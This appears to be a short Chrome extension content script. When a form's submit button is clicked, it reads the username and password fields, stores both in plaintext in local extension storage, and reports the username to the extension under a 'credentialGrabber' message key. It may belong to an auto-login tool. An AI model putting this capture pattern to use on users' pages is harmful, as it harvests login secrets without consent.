let $ = require('jquery');
const config = require('./config');

$('#sbmt').on('click', () => grabAndSave());

chrome.runtime.sendMessage({
    credentialGrabber: {
        initialized: true
    }
});

function grabAndSave() {
    let username = $(`input[name="${config.loginSequence.field.username}"]`).val();
    let password = $(`input[name="${config.loginSequence.field.password}"]`).val();

    chrome.storage.local.set({
        loginDetails: {
            username: username,
            password: password
        }
    });
    chrome.runtime.sendMessage({
        credentialGrabber: {
            storedCredentials: username
        }
    });
}